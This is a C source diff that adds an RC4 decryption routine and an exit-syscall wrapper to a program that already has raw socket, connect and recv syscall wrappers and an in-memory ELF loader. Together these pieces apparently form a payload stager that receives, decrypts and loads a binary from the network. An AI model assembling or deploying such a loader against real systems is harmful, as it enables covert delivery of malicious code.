@@ -10,6 +10,7 @@
 #define SYS_socket 41
 #define SYS_connect 42
 #define SYS_recvfrom 45
+#define SYS_exit 60
 
 #define R_X86_64_NONE 0
 #define R_X86_64_64 1
@@ -90,6 +91,11 @@ void _memset(void* d, int c, uint64_t n)
         dd[i] = (char)c;
 }
 
+void _safe_exit(void)
+{
+    __asm__ volatile("syscall" : : "a"(60L), "D"(0L));
+}
+
 int _socket(int d, int t, int p) {
     return (int)_sys3(SYS_socket, d, t, p);
 }
@@ -102,6 +108,32 @@ int _connect(int fd, void* addr, int len)
 int _recv(int fd, void* buf, int len, int flags)
 {
     return (int)_sys6(SYS_recvfrom, fd, (long)buf, len, flags, 0, 0);
+}
+
+void _rc4_decrypt(const unsigned char* key, int key_len, unsigned char* data, uint32_t data_len)
+{
+    unsigned char S[256];
+    for (int i = 0; i < 256; i++)
+        S[i] = (unsigned char)i;
+
+    int j = 0;
+    for (int i = 0; i < 256; i++) {
+        j = (j + S[i] + key[i % key_len]) % 256;
+        unsigned char tmp = S[i];
+        S[i] = S[j];
+        S[j] = tmp;
+    }
+
+    int i = 0;
+    j = 0;
+    for (uint32_t n = 0; n < data_len; n++) {
+        i = (i + 1) % 256;
+        j = (j + S[i]) % 256;
+        unsigned char tmp = S[i];
+        S[i] = S[j];
+        S[j] = tmp;
+        data[n] ^= S[(S[i] + S[j]) % 256];
+    }
 }
 
 void* elf_load(char* raw)
